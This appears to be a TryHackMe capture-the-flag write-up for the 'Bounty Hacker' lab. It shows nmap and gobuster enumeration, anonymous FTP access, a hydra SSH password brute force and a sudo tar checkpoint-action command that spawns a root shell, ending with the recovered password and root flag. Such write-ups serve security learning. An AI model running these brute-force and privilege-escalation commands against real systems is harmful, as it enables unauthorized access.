#TryHackMe 
# Enum
## nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.28.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

## gobuster
/images               (Status: 301) [Size: 297] [--> http://elit/images/]
/index.html           (Status: 200) [Size: 969]
/index.html           (Status: 200) [Size: 969]

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Bounty_Hacker]
└─# ftp elit
	ftp> ls
	229 Entering Extended Passive Mode (|||40187|)
	150 Here comes the directory listing.
	-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
	-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt

# Exploit
┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Bounty_Hacker]
└─# hydra 10.10.87.138 -s 22 ssh -l lin -P locks.txt
	[22][ssh] host: 10.10.87.138   login: lin   password: RedDr4gonSynd1cat3

# FootHold
[lin@bountyhacker:/home$] sudo -l
	[sudo] password for lin: 
	User lin may run the following commands on bountyhacker:
	    (root) /bin/tar


# PrivEsc
[lin@bountyhacker:/home$] sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
[lin@bountyhacker:/home#] id
	uid=0(root) gid=0(root) groups=0(root)
[lin@bountyhacker:/home#] cat /root/root.txt
	THM{80UN7Y_h4cK3r}